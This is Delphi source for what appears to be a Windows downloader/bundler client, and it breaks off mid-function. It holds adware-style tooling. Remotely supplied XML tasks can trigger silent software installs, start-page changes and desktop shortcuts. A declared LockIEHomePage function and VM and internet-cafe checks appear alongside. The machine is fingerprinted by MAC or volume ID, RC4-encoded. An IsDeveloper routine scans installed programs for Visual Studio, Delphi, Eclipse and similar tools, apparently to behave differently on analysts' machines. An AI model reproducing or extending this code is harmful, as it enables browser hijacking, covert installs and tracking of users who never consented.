unit UnitFuc;

interface

{$DEFINE UsesIDHTTP}

uses
  Windows, SysUtils, UnitType, ShlObj, StrUtils, MD5Unit, Registry, Classes,
  Masks, DUIBitmap32, msxml, Variants, UrlMon, DUICore, ShellAPI, ActiveX,
  ZLib, {$IFDEF USE_XLSDK} XlDownUnit, {$ELSE} HttpDowner,
{$ENDIF} ThunderAgentLib_TLB, UnitError {$IFDEF UsesIDHTTP}, IdHTTP
{$ENDIF}, DUIiniFiles, TlHelp32, IdURI, RC4Engine, EncdDecd, IpTypes, HTTPApp,
  WinInet;

procedure ShowMsg(const Msg: string);
function RightPos(const SubStr, Str: string): Integer;
function GetSpecialFolderDir(mFolder: Integer): string;
function CreateWorkPath(): string; 
function GetTmpPath(): string; 
function MacAddress: string;
function IsWin64: Boolean;
{$IFDEF UsesIDHTTP}
function GetWebString(const ASrcUrl: string; UseCache: Boolean = True;
  IsUtf8: Boolean = True; bUseCookie: Boolean = False): string;
function PostWebString(const ASrcUrl: string; const PostStr: string;
  Encode: TEncoding = nil; UseCache: Boolean = True): string;
function IdHttpDownToPath(const URL: string; const DstPath: string;
  var FileName: string; const UseCache: Boolean = True): Boolean;
{$ELSE}
function GetWebString(const ASrcUrl: string; UseCache: Boolean = True;
  IsUtf8: Boolean = False): string;
{$ENDIF}
function IsDeveloper(): Boolean;
function LoadBmpByName(const AName: string): IDUIBitmap32;
function UrlDownloadFile(SourceFile, TargetFile: string): Boolean;
function DownloadTaskFile(SourceFile: string; var TargetFile: string): Boolean;
function AddUrlParams(const URL: string; const Params: string): String;

function LoadWebInfo(): Boolean; 
function ArgumentInit(): Boolean; 
function ExtractTaskInfo(ANode: IXMLDOMNode; var ATask: TTaskInfo): Boolean;
function ShellFileExists(cmdLine, Ext: string): Boolean; 
function CheckTaskRepeat(ATask: TTaskInfo): Boolean; 
function ExtractCheckFileName(ASrcFileName: string): string;
function GetUrlFileName(AUrl: string): string;
function ExtractFileNameNoExt(const FileName: string): string;
function GetSoleFileName(ADestPath: string): string;
procedure RemoveDirAndChildrens(pPath: string); 
function StringToArray(var Dest: array of Char; Source: string): PChar;
function ArrayToString(ASrc: array of Char): string;
function IsHttpUrl(const SrcUrl: string): Boolean;
function CreateDownloadPath(): string;
function ByteToString(const AValue: Int64; const Format: string = '0.0')
  : string;
procedure InitShellRecord(var ShExecInfo: SHELLEXECUTEINFOW);
procedure OpenSelectFile(const AFileName: string);
function LockIEHomePage(const URL: string;
  const bDisableChange: Boolean = False): Boolean;
function GetIEVersionStr: string;
function AddSpliteString(const ASrcStr: string; const AAddStr: string;
  const ASplite: string = '|'): string;
function CreateComObject(const ClassID: TGUID): IUnknown;
function CreateDeskupLink(const ATarget, ALinkName, AIconSrc,
  AWorkingDirectory, AArgument, ADescription: string;
  const AIconIndex: Integer; const ATaskId: string): Boolean;
function CreateQuickLaunchShortcut(const ATarget, ALinkName, AIconSrc,
  AWorkingDirectory, AArgument, ADescription: string;
  const AIconIndex: Integer): Boolean;
function GetIEAppPath: string;
function SubReBrowserLnk(const ATarUrl: string): Integer;
procedure FindAllFiles(const APath: string; AFiles: TStrings;
  const APropty: String = '*.*'; IsAddPath: Boolean = True);
function CheckTaskInstalled(AKeyName: string): Boolean; 
function ShellOpenFile(const AFileName: string): Boolean;
{$IFNDEF USE_XLSDK}
function LoadHttpSdkByFile(): Boolean;
function LoadHttpSdkByMemory(): Boolean;
function LoadHttpSdk(): Boolean;
{$ENDIF}
function DownloadByThunder(const URL: string; const RefUrl: string = '')
  : Boolean;
function IsFileInUse(fName: string): Boolean;
function FileSize(FileName: string): Int64;
function ExtractResToFile(ResType, ResName, ResNewName: String): Boolean;
{$IFDEF USE_XLSDK}
function SetFreeXlSdk(): Boolean;
procedure ReadHisIni(var AHis: THisConfigInfo); 
procedure SaveHisIni(AHis: THisConfigInfo);
{$ENDIF}

function GetMaxDriver(const bFreeSpace: Boolean = True;
  szSize: PInt64 = nil): string;

function GetSDState(): Cardinal;
function SetFileReadOnly(const FileName: string): Boolean;
function SetFileNotReadOnly(const FileName: string): Boolean;
function FixPath(APath: string): string;

function LoadRegModule(node: IXMLDOMNode): Integer; overload;
function LoadRegModule(nodeStr: string): Integer; overload;

function EncString(Str: string): string;
function DecString(Str: string): string;
function RndPercent(const APer: Integer): Boolean;
function URLDecode(URL: string): string;
function URLEncode(URL: string): string;

function IsXmlStr(strXML: string): Boolean;

function IsWangBaPC(): Boolean;

function IsVMPC(): Boolean;

function GetUserEV(): DWORD;

function SpliteString(const Str: string; const strSpl: string;
  strList: TStrings): Integer;

function RC4Base64Decode(const ASrc: string; const AKey: AnsiString): string;

function RC4Base64Encode(const ASrc: string; const AKey: AnsiString): string;

function GetVolumeAddress(): string;

function GetAdapterAddress: string;

implementation

uses
  UnitConfig, RemoteModule;

procedure ShowMsg(const Msg: string);
begin
  Windows.MessageBox(0, PChar(Msg), nil, MB_OK);
end;

function AddUrlParams(const URL: string; const Params: string): String;
begin
  if (Pos('?', URL) > 0) or (Pos('&', URL) > 0) then
    Result := URL + '&' + Params
  else
    Result := URL + '?' + Params;
end;

function UrlDownloadFile(SourceFile, TargetFile: string): Boolean;
begin
  Result := UrlDownloadToFile(nil, PChar(SourceFile), PChar(TargetFile), 0,
    nil) = 0;
end;

function DownloadTaskFile(SourceFile: string; var TargetFile: string): Boolean;
var
  i: Integer;
  fName: string;
begin
  for i := 0 to DownTaskTryNum - 1 do
  begin
    fName := ExtractFileName(TargetFile);
    if (fName = '') or (MatchesMask(fName, '{unknow}*')) then
    begin
      Result := IdHttpDownToPath(SourceFile, ExtractFilePath(TargetFile),
        fName);
      if Result then
        TargetFile := IncludeTrailingPathDelimiter(ExtractFilePath(TargetFile))
          + fName;
    end
    else
      Result := UrlDownloadFile(SourceFile, TargetFile);

    if Result then
      Exit;
  end;
end;

function LoadBmpByName(const AName: string): IDUIBitmap32;
begin
  Result := TDUIBitmap32.FromResource(HInstance, AName, RT_RCDATA);
end;

function RightPos(const SubStr, Str: string): Integer;
var
  i, j, k, LenSub, LenS: Integer;
begin
  Result := 0;
  LenSub := Length(SubStr);
  LenS := Length(Str);
  if (LenSub = 0) or (LenS = 0) or (LenSub > LenS) then
    Exit;
  for i := LenS downto 1 do
  begin
    k := 0; 
    if Str[i] = SubStr[LenSub] then
    begin
      for j := LenSub downto 1 do
      begin
        if SubStr[j] = Str[i - (LenSub - j)] then
          inc(k)
        else
          Break;
      end;
    end;
    if k = LenSub then
    begin
      Result := i - LenSub + 1;
      Exit;
    end;
  end;
end;

function GetSpecialFolderDir(mFolder: Integer): string;

var
  vItemIDList: PItemIDList;
  vBuffer: array [0 .. MAX_PATH] of Char;
begin
  Result := '';
  SHGetSpecialFolderLocation(0, mFolder, vItemIDList);
  SHGetPathFromIDList(vItemIDList, vBuffer); 
  Result := vBuffer;
  if RightStr(Result, 1) <> '\' then
    Result := Result + '\';
end;

function GetTmpPath(): string;

var
  prArr: array [0 .. MAX_PATH] of Char;
begin
  GetTempPath(MAX_PATH, prArr);
  Result := prArr;
  if (Result <> '') and (RightStr(Result, 1) <> '\') then
    Result := Result + '\';
end;

function CreateWorkPath(): string;

var
  prTmp: string;
  prPath: string;
  function prGetRndStr(const AStrLen: Byte): string;
  var
    i: Byte;
    S: string;
  begin
    S := 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    Result := '';
    for i := 0 to AStrLen - 1 do
      Result := Result + S[Random(Length(S) - 1) + 1];
  end;

begin
  prTmp := GetTmpPath;
  if prTmp = '' then
  begin
    prTmp := GetSpecialFolderDir(CSIDL_LOCAL_APPDATA);
    if RightStr(prTmp, 1) <> '\' then
      prTmp := prTmp + '\';
    prTmp := prTmp + 'stdDowner\';
  end;
  while True do
  begin
    prPath := prTmp + 'std' + prGetRndStr(5) + '.tmp\';
    if not DirectoryExists(prPath) then
    begin
      ForceDirectories(prPath);
      Result := prPath;
      Break;
    end;
  end;
end;

function MacAddress: string;

var
  Lib: Cardinal;
  Func: function(GUID: PGUID): Longint;
stdcall;
GUID1, GUID2: TGUID;
begin
  Result := '';
  Lib := LoadLibrary('rpcrt4.dll');
  if Lib <> 0 then
  begin
    if Win32Platform <> VER_PLATFORM_WIN32_NT then
      @Func := GetProcAddress(Lib, 'UuidCreate')
    else
      @Func := GetProcAddress(Lib, 'UuidCreateSequential');
    if Assigned(Func) then
    begin
      if (Func(@GUID1) = 0) and (Func(@GUID2) = 0) and
        (GUID1.D4[2] = GUID2.D4[2]) and (GUID1.D4[3] = GUID2.D4[3]) and
        (GUID1.D4[4] = GUID2.D4[4]) and (GUID1.D4[5] = GUID2.D4[5]) and
        (GUID1.D4[6] = GUID2.D4[6]) and (GUID1.D4[7] = GUID2.D4[7]) then
      begin
        Result := IntToHex(GUID1.D4[2], 2) + '-' + IntToHex(GUID1.D4[3], 2)
          + '-' + IntToHex(GUID1.D4[4], 2) + '-' + IntToHex(GUID1.D4[5], 2)
          + '-' + IntToHex(GUID1.D4[6], 2) + '-' + IntToHex(GUID1.D4[7], 2);
      end;
    end;
    FreeLibrary(Lib);
  end;
end;

function IsWin64: Boolean;
const
  PROCESSOR_ARCHITECTURE_AMD64 = 9;
  PROCESSOR_ARCHITECTURE_IA64 = 6;
var
  Kernel32Handle: THandle;
  IsWow64Process: function(Handle: Windows.THandle;
    var Res: Windows.Bool): Windows.Bool;
stdcall;
var
  GetNativeSystemInfo: procedure(var lpSystemInfo: TSystemInfo);
stdcall;
isWoW64 :
Bool;
SystemInfo :
TSystemInfo;
begin
  Result := False;
  Kernel32Handle := GetModuleHandle('KERNEL32.DLL');
  if Kernel32Handle = 0 then
    Kernel32Handle := LoadLibrary('KERNEL32.DLL');
  if Kernel32Handle <> 0 then
  begin
    IsWow64Process := GetProcAddress(Kernel32Handle, 'IsWow64Process');
    
    GetNativeSystemInfo := GetProcAddress(Kernel32Handle,
      'GetNativeSystemInfo');
    if Assigned(IsWow64Process) then
    begin
      IsWow64Process(GetCurrentProcess, isWoW64);
      Result := isWoW64 and Assigned(GetNativeSystemInfo);
      if Result then
      begin
        GetNativeSystemInfo(SystemInfo);
        Result := (SystemInfo.wProcessorArchitecture =
            PROCESSOR_ARCHITECTURE_AMD64) or
          (SystemInfo.wProcessorArchitecture =
            PROCESSOR_ARCHITECTURE_IA64);
      end;
    end;
  end;
end;
{$IFDEF UsesIDHTTP}

function GetWebString(const ASrcUrl: string; UseCache: Boolean = True;
  IsUtf8: Boolean = True; bUseCookie: Boolean = False): string;
var
  pHttp: TIdHTTP;
  pStream: TStringStream;
  i: Integer;
begin
  Result := '';
  try
    pHttp := TIdHTTP.Create(nil);
    with pHttp do
      try
        HandleRedirects := True;
        
        if not UseCache then
        begin
          Request.CacheControl := 'no-cache';
          Request.Pragma := 'no-cache';
        end;
        if IsUtf8 then
        begin
          pStream := TStringStream.Create('', TEncoding.UTF8);
          try
            Get(ASrcUrl, pStream);
            Result := pStream.DataString;
            if DWORD(Result[1]) = $FEFF then 
              Result := RightStr(Result, Length(Result) - 1);
          finally
            pStream.Free;
          end;
        end
        else
          Result := Get(ASrcUrl);
        if (bUseCookie) then
        begin
          try
            for i := 0 to pHttp.CookieManager.CookieCollection.Count - 1 do
            begin
              WinInet.InternetSetCookie(PChar(ASrcUrl), nil,
                PChar(pHttp.CookieManager.CookieCollection.Items[i].CookieText)
                );
            end;
          except
          end;
        end;
      finally
        FreeAndNil(pHttp);
      end;
  except
  end;
end;

function PostWebString(const ASrcUrl: string; const PostStr: string;
  Encode: TEncoding = nil; UseCache: Boolean = True): string;
var
  pHttp: TIdHTTP;
  pStream: TStringStream;
  PostLst: TStringList;
begin
  Result := '';
  try
    pHttp := TIdHTTP.Create(nil);
    with pHttp do
      try
        HandleRedirects := True;
        Request.UserAgent :=
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)';
        if not UseCache then
        begin
          Request.CacheControl := 'no-cache';
          Request.Pragma := 'no-cache';
        end;
        if not Assigned(Encode) then
          Encode := TEncoding.Default;
        pStream := TStringStream.Create('', Encode);
        PostLst := TStringList.Create;
        try
          SpliteString(PostStr, '&', PostLst);
          Post(ASrcUrl, PostLst, pStream);
          Result := pStream.DataString;
        finally
          PostLst.Free;
          pStream.Free;
        end;
      finally
        FreeAndNil(pHttp);
      end;
  except
  end;
end;

function IdHttpDownToPath(const URL: string; const DstPath: string;
  var FileName: string; const UseCache: Boolean = True): Boolean;
var
  pHttp: TIdHTTP;
  pMem: TMemoryStream;
  dstFilePath: string;
  dstName: string;
begin
  Result := False;
  try
    pHttp := TIdHTTP.Create(nil);
    try
      pHttp.HandleRedirects := True;
      pHttp.Request.UserAgent :=
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)';
      if not UseCache then
      begin
        pHttp.Request.CacheControl := 'no-cache';
        pHttp.Request.Pragma := 'no-cache';
      end;
      pMem := TMemoryStream.Create;
      try
        pHttp.Get(URL, pMem);
        if pMem.Size > 0 then
        begin
          dstName := pHttp.URL.Document;

          dstFilePath := IncludeTrailingPathDelimiter(DstPath) + dstName;
          pMem.SaveToFile(dstFilePath);
          Result := FileExists(dstFilePath);
          if Result then
          begin
            FileName := dstName;
          end;
        end;
      finally
        pMem.Free;
      end;
    finally
      pHttp.Free;
    end;
  except
  end;
end;
{$ELSE}

function GetWebString(const ASrcUrl: string; UseCache: Boolean = True;
  IsUtf8: Boolean = False): string;
var
  req: IXMLHTTPRequest;
begin
  try
    req := CoXMLHTTP.Create; 
    req.open('GET', ASrcUrl, False, EmptyParam, EmptyParam);
    try
      if (not UseCache) and (req.readyState = 1) then
      begin
        req.setRequestHeader('Pragma', 'no-cache');
        req.setRequestHeader('Cache-Control', 'no-cache');
        req.setRequestHeader('If-Modified-Since', '0');
      end;
    except
    end;
    req.send(EmptyParam);
    Result := req.responseText;
    if IsUtf8 then
      Result := UTF8ToString(Result);
  except
    Result := '';
  end;
end;
{$ENDIF}

function IsDeveloper(): Boolean;

var
  reg: TRegistry;
  regList: TStringList;
  function pIsDeveloper(): Boolean;
  var
    i: Integer;
    prRegStr: string;
  begin
    Result := False;
    for i := 0 to regList.Count - 1 do
    begin
      prRegStr := regList.Strings[i];
      if MatchesMask(prRegStr, '*Microsoft Visual Studio*') or MatchesMask
        (prRegStr, '*MSDN Library*') or MatchesMask(prRegStr,
        '*Delphi and C++Builder*') or MatchesMask(prRegStr, '*Dreamweaver*')
        or MatchesMask(prRegStr, '*phpDesigner*') or MatchesMask(prRegStr,
        '*IETester*') or MatchesMask(prRegStr, '*eclipse*') or (prRegStr = 'e')
        or (prRegStr = 'NSIS') then
      begin
        Result := True;
        Break;
      end;
    end;
  end;

begin
  try
    try
      Result := False;
      reg := TRegistry.Create;
      regList := TStringList.Create;

      reg.RootKey := HKEY_CURRENT_USER;
      if reg.OpenKeyReadOnly(
        'Software\Microsoft\Windows\CurrentVersion\Uninstall') then
      begin
        reg.GetKeyNames(regList);
        Result := pIsDeveloper;
        reg.CloseKey;
      end;
      if not Result then
      begin
        reg.RootKey := HKEY_LOCAL_MACHINE;
        if reg.OpenKeyReadOnly(
          'Software\Microsoft\Windows\CurrentVersion\Uninstall') then
        begin
          reg.GetKeyNames(regList);
          Result := pIsDeveloper;
          reg.CloseKey;
        end;
      end;
      if (not Result) and (bIsWin64) then
      begin
        reg.Access := reg.Access or KEY_WOW64_64KEY;
        if not Result then
        begin
          reg.RootKey := HKEY_CURRENT_USER;
          if reg.OpenKeyReadOnly(
            'Software\Microsoft\Windows\CurrentVersion\Uninstall') then
          begin
            reg.GetKeyNames(regList);
            Result := pIsDeveloper;
            reg.CloseKey;
          end;
        end;
        if not Result then
        begin
          reg.RootKey := HKEY_LOCAL_MACHINE;
          if reg.OpenKeyReadOnly(
            'Software\Microsoft\Windows\CurrentVersion\Uninstall') then
          begin
            reg.GetKeyNames(regList);
            Result := pIsDeveloper;
            reg.CloseKey;
          end;
        end;
      end;
    finally
      reg.Free;
      regList.Free;
    end;
  except
  end;
end;

function LoadWebInfo(): Boolean;
  function ExtractFileSoftInfo(AFileName: string; var AWebInfo: TWebXmlInfo;
    var ASoftInfo: TSoftXmlInfo): Boolean;
  var
    i, iRet: Integer;
    pTmpStr, pTmp: string;
  const
    WebIDLen = 1;
  begin
    Result := False;
    iRet := RightPos('_', AFileName);

    if iRet > 0 then
    begin
      pTmpStr := Copy(AFileName, iRet + 1, Length(AFileName) - iRet);
      iRet := RightPos('.', pTmpStr);
      if iRet > 0 then
      begin
        pTmpStr := Copy(pTmpStr, 1, iRet - 1);
        iRet := Pos('@', pTmpStr);
        if (iRet > 0) and (iRet <= 5) then
        begin
          AWebInfo.id := Trim(Copy(pTmpStr, 1, iRet - 1));
          pTmpStr := Trim(Copy(pTmpStr, iRet + 1, Length(pTmpStr)));
        end
        else
        begin
          AWebInfo.id := Trim(Copy(pTmpStr, 1, WebIDLen));
          pTmpStr := Trim(Copy(pTmpStr, WebIDLen + 1,
              Length(pTmpStr) - WebIDLen));
        end;

        if (Length(pTmpStr) >= 1) and (Trim(AWebInfo.id) <> '') then
        begin
          pTmp := '';
          for i := 1 to Length(pTmpStr) do
          begin
            if not(pTmpStr[i] in ['0' .. '9', 'a' .. 'z', 'A' .. 'Z']) then
              Break
            else
              pTmp := pTmp + pTmpStr[i];
          end;
          if pTmp <> '' then
          begin
            ASoftInfo.softid := pTmp;
            Result := True;
          end;
        end;
      end;
    end;
  end;

var
  prName: string;
begin
  Result := False;
  prName := ExtractFileName(ParamStr(0));
  if bIsDebug then
    prName := BugFileName;
  Result := ExtractFileSoftInfo(prName, WebInfo, SoftInfo);
  if (not Result) and (bForceGetWebXml) then
  begin
    WebInfo.id := DefaultWebID;
    SoftInfo.softid := DefaultSoftID;
    Result := True;
  end;
end;

function ArgumentInit(): Boolean;
var
  tmpStr: string;
  i: Integer;
  reg: TRegistry;
  tmpNum: Integer;
begin
  Result := False;
  try
    nStartTime := GetCurrentTime();

    tmpStr := GetSpecialFolderDir(CSIDL_APPDATA);
    DataPath := tmpStr + AppEnName + '\';
    if not DirectoryExists(DataPath) then
      ForceDirectories(DataPath);

    tmpStr := GetSpecialFolderDir(CSIDL_LOCAL_APPDATA);
    IconPath := tmpStr + AppEnName + '\DeskupIcon\';
    if not DirectoryExists(IconPath) then
      ForceDirectories(IconPath);

    WorkPath := CreateWorkPath;
    try
{$IFDEF USE_XLSDK}
      if not SetFreeXlSdk() then
      begin
        ErrorNum := S_ERR_XLSDKFREE;
        Exit;
      end;
      HisConfig := TDUIiniFiles.Create(DataPath + 'History.ini');
      
      Result := XlDownUnit.InitXlEngine(DataPath + 'xldl.dll');
{$ELSE}
      if not LoadHttpSdk() then
      begin
        ErrorNum := S_ERR_HTTPINIT;
        Exit;
      end;
      HttpFtp_SetVerInfo(702546, 12759, 12549, 'Build20141208');
      bHttpStartUp := HttpFtp_Startup();
      if not(bHttpStartUp) then
      begin
        ErrorNum := S_ERR_HTTPSTART;
        Exit;
      end;
{$ENDIF}
    except
      ErrorNum := S_ERR_HTTPCATCH;
    end;
    ExeName := ExtractFileName(ParamStr(0));
    try
      
      tmpStr := GetVolumeAddress();
      if Trim(tmpStr) = '' then
        tmpStr := GetAdapterAddress();
      if Trim(tmpStr) = '' then
        tmpStr := MacAddress();
      MacStr := HTTPApp.HTTPEncode(RC4Base64Encode(tmpStr, strRC4PassWord));

      if not bIsDebug then
        bIsDeveloper := IsDeveloper;
      bIsWin64 := IsWin64;
      IEVersionStr := GetIEVersionStr;
    except
    end;
    
    DesktopPath := GetSpecialFolderDir(CSIDL_DESKTOP);
    SoftInfo.Init;
    
    for i := 0 to Length(TaskList) - 1 do
      TaskList[i] := TTaskInfoList.Create;
    TaskAltList := TTaskInfoList.Create;
    
    try
      reg := TRegistry.Create;
      try
        reg.RootKey := HKEY_CURRENT_USER;
        if reg.OpenKey('Software\' + AppEnName, True) then
        begin
          if reg.ValueExists('usestime') then
            tmpNum := reg.ReadInteger('usestime')
          else
            tmpNum := 0;
          inc(tmpNum);
          reg.WriteInteger('usestime', tmpNum);
          nUsesNumber := tmpNum;
        end;
      finally
        reg.Free;
      end;
    except
    end;
    
    RMManager := TRomoteManager.Create;
    RMManager2 := TRomoteManager.Create;
    
    hUserEV := GetUserEV();

    Result := True;
  except
    ErrorNum := S_ERR_ARGINIT;
    Result := False;
  end;
end;

function ExtractTaskInfo(ANode: IXMLDOMNode; var ATask: TTaskInfo): Boolean;
var
  i: Integer;
  tmpName, tmpValue: string;
  NodeList: IXMLDOMNodeList;
  node: IXMLDOMNode;
begin
  Result := False;
  if not Assigned(ANode) then
    Exit;
  ATask.ToZero;
  
  if Assigned(ANode.attributes) then
  begin
    for i := 0 to ANode.attributes.Length - 1 do
    begin
      tmpName := LowerCase(ANode.attributes.item[i].nodeName);
      tmpValue := ANode.attributes.item[i].nodeValue;
      if tmpName = 'silent' then
        ATask.silent := StrToBoolDef(tmpValue, False)
      else if tmpName = 'visible' then
        ATask.visible := StrToBoolDef(tmpValue, True)
      else if tmpName = 'taskid' then
        ATask.taskid := StrToIntDef(tmpValue, -1)
      else if tmpName = 'tasktype' then
      begin
        tmpValue := LowerCase(tmpValue);
        if tmpValue = 'startpage' then
          ATask.tasktype := tsstartpage
        else if tmpValue = 'createlink' then
          ATask.tasktype := tscreatelink
        else if tmpValue = 'install' then
          ATask.tasktype := tsinstall
        else if tmpValue = 'textlink' then
          ATask.tasktype := tstextlink
        else if tmpValue = 'imglink' then
          ATask.tasktype := tsimglink
        else if tmpValue = 'swflink' then
          ATask.tasktype := tsswflink
        else if tmpValue = 'giflink' then
          ATask.tasktype := tsgiflink
        else
          Exit;
      end
      else if tmpName = 'taskname' then
        ATask.taskname := tmpValue
      else if tmpName = 'deskname' then
        ATask.deskname := tmpValue
      else if tmpName = 'tiptext' then
        ATask.tiptext := tmpValue
      else if tmpName = 'defcheck' then
        ATask.defcheck := StrToBoolDef(tmpValue, True)
      else if tmpName = 'altid' then
        ATask.altid := StrToIntDef(tmpValue, -1)
      else if tmpName = 'savepath' then
        ATask.savepath := tmpValue
      else if tmpName = 'rootkey' then
        ATask.RootKey := tmpValue
      else if tmpName = 'keyname' then
        ATask.keyname := tmpValue
      else if tmpName = 'regext' then
        ATask.regext := tmpValue
      else if tmpName = 'detectitem' then
        ATask.detectitem := tmpValue
      else if tmpName = 'taskcolor' then
        ATask.taskcolor := StrToIntDef(tmpValue, 0)
      else if tmpName = 'img' then
        ATask.img := tmpValue
    end;
  end;
  
  if ANode.hasChildNodes then
  begin
    NodeList := ANode.childNodes;
    for i := 0 to NodeList.Length - 1 do
    begin
      node := NodeList.item[i];
      tmpName := LowerCase(node.nodeName);
      tmpValue := node.text;
      if tmpName = 'taskurl' then
        ATask.taskurl := tmpValue
      else if tmpName = 'linkico' then
        ATask.linkico := tmpValue
      else if tmpName = 'cmdline' then
        ATask.cmdLine := tmpValue
      else if tmpName = 'logourl' then
        ATask.logourl := tmpValue;
    end;
  end;
  if (ATask.taskid >= 0) and (ATask.taskname <> '') and (ATask.taskurl <> '')
    then
    Result := True;
end;

function CheckTaskRepeat(ATask: TTaskInfo): Boolean;
var
  reg: TRegistry;
  function pCheckRegTask(): Boolean;
  var
    prStr: string;
  begin
    Result := False;
    if reg.OpenKeyReadOnly(
      'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + ATask.RootKey)
      then
    begin
      prStr := reg.ReadString(ATask.keyname);
      if ShellFileExists(prStr, '.' + ATask.regext) then
      begin
        Result := True;
        Exit;
      end;
      reg.CloseKey;
    end;
  end;

begin
  Result := False;
  if ATask.tasktype = tsinstall then
  begin
    reg := TRegistry.Create;
    try
      reg.RootKey := HKEY_CURRENT_USER;
      Result := pCheckRegTask;

      if not Result then
      begin
        reg.RootKey := HKEY_LOCAL_MACHINE;
        Result := pCheckRegTask;
      end;

      if not Result then
      begin
        reg.RootKey := HKEY_CURRENT_USER;
        reg.Access := reg.Access or KEY_WOW64_64KEY;
        Result := pCheckRegTask;
      end;

      if not Result then
      begin
        reg.RootKey := HKEY_LOCAL_MACHINE;
        reg.Access := reg.Access or KEY_WOW64_64KEY;
        Result := pCheckRegTask;
      end;

      if Result then
        Referrepeat := AddSpliteString(Referrepeat, IntToStr(ATask.taskid));
    finally
      reg.Free;
    end;
  end;
end;

function ShellFileExists(cmdLine, Ext: string): Boolean;
var
  Buf: array [0 .. MAX_PATH] of Char;
  tmpStr: string;
  iRet: Integer;
begin
  Result := False;
  ExpandEnvironmentStrings(PChar(cmdLine), PChar(@Buf), MAX_PATH);
  tmpStr := Buf;
  iRet := RightPos(LowerCase(Ext), LowerCase(tmpStr));
  if iRet > 0 then
    tmpStr := LeftStr(tmpStr, iRet + Length(Ext) - 1);
  if (LeftStr(tmpStr, 1) = '"') or (LeftStr(tmpStr, 1) = '''') then
    tmpStr := RightStr(tmpStr, Length(tmpStr) - 1);
  if ((Trim(tmpStr) <> '') and FileExists(tmpStr)) or
    (MatchesMask(LowerCase(tmpStr), 'msiexec.exe *')) then
    Result := True;
end;

function ExtractCheckFileName(ASrcFileName: string): string;
var
  i: Integer;
  
begin
  ASrcFileName := Trim(ASrcFileName);
  Result := ASrcFileName;
  ASrcFileName := StringReplace(ASrcFileName, '/', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '\', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, ':', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '*', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '<', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '>', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '|', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '"', '', [rfReplaceAll]);
  ASrcFileName := StringReplace(ASrcFileName, '?', '', [rfReplaceAll]);
  for i := Length(ASrcFileName) - 1 downto 0 do
  begin
    if RightStr(ASrcFileName, 1) = '.' then
      ASrcFileName := LeftStr(ASrcFileName, Length(ASrcFileName) - 1)
    else
      Break;
  end;
  Result := ASrcFileName;
end;

function GetUrlFileName(AUrl: string): string;

var
  pString: string;
  pInteger: Integer;
begin
  pString := StringReplace(AUrl, '\', '/', [rfReplaceAll]);
  pInteger := Pos('?', pString);
  if pInteger <> 0 then
    pString := Copy(pString, 1, pInteger - 1);
  pInteger := RightPos('/', pString);
  if pInteger <> 0 then
    pString := Copy(pString, pInteger + 1, Length(pString) - pInteger);
  pString := ExtractCheckFileName(pString);
  Result := pString;
end;

function ExtractFileNameNoExt(const FileName: string): string;

var
  prPos: Integer;
begin
  Result := ExtractFileName(FileName);
  prPos := RightPos('.', Result);
  if prPos <> 0 then
  begin
    Result := Copy(Result, 1, prPos - 1);
  end;
end;

function GetSoleFileName(ADestPath: string): string;

var
  prPath, prName, prExt: string;
  prPathName: string;
  i: Integer;
begin
  Result := ADestPath;
  if (not FileExists(ADestPath)) then
    Exit;
  prPath := ExtractFilePath(ADestPath);
  prName := ExtractFileNameNoExt(ADestPath);
  prExt := ExtractFileExt(ADestPath);
  i := 0;
  while True do
  begin
    inc(i);
    prPathName := prPath + prName + '(' + IntToStr(i) + ')' + prExt;
    if (not FileExists(prPathName)) then
    begin
      Result := prPathName;
      Break;
    end;
  end;
end;

procedure RemoveDirAndChildrens(pPath: string);

var
  search: TSearchRec;
  ret: Integer;
  key: string;
begin
  if pPath[Length(pPath)] <> '\' then
    pPath := pPath + '\';
  key := pPath + '*.*';
  ret := findFirst(key, faanyfile, search);
  while ret = 0 do
  begin
    if ((search.Attr and fadirectory) = fadirectory) then
    begin
      if (search.Name <> '.') and (search.name <> '..') then
        RemoveDirAndChildrens(pPath + search.name);
    end
    else
    begin
      if ((search.Attr and fadirectory) <> fadirectory) then
      begin
        deletefile(pPath + search.name);
      end;
    end;
    ret := FindNext(search);
  end;
  findClose(search);
  removedir(pPath);
end;

function StringToArray(var Dest: array of Char; Source: string): PChar;
begin
  Result := StrLCopy(PChar(@Dest), PChar(Source), High(Dest) - Low(Dest));
end;

function ArrayToString(ASrc: array of Char): string;

var
  iRet: Integer;
begin
  iRet := Pos(#0, ASrc);
  if iRet > 0 then
    SetString(Result, PChar(@ASrc), iRet - 1)
  else
    Result := ASrc;
end;

function IsHttpUrl(const SrcUrl: string): Boolean;

var
  pStr: string;
begin
  pStr := LowerCase(SrcUrl);
  if MatchesMask(SrcUrl, 'http*://?*.?*') then
    Result := True
  else
    Result := False;
end;

function CreateDownloadPath(): string;

var
  prTmp: string;
begin
  if bDownToDesktop then
  begin
    prTmp := GetSpecialFolderDir(CSIDL_DESKTOP);
    if prTmp = '' then
      prTmp := GetTmpPath;
  end
  else if bDownToMaxDriver then
  begin
    try
      prTmp := GetMaxDriver();
      if prTmp = '' then
        prTmp := GetTmpPath;
      prTmp := FixPath(prTmp);
      if (prTmp <> '') then
      begin
        prTmp := prTmp + AppDownPathName + '\Download\';
      end;
    except
    end;
  end
  else
  begin
    prTmp := GetSpecialFolderDir(CSIDL_LOCAL_APPDATA);
    if prTmp = '' then
      prTmp := GetTmpPath;
    prTmp := FixPath(prTmp);
    prTmp := prTmp + AppDownPathName + '\Download\';
  end;

  if prTmp = '' then
    prTmp := GetTmpPath;
  prTmp := FixPath(prTmp);
  if not DirectoryExists(prTmp) then
    ForceDirectories(prTmp);
  Result := prTmp;
end;

function FixPath(APath: string): string;
begin
  if APath <> '' then
    Result := IncludeTrailingPathDelimiter(APath)
  else
    Result := '';
end;

function ByteToString(const AValue: Int64; const Format: string = '0.0')
  : string;

begin
  if AValue >= 1073741824 then
    Result := FormatFloat(Format, AValue / 1073741824) + ' GB'
  else if AValue >= 1048576 then
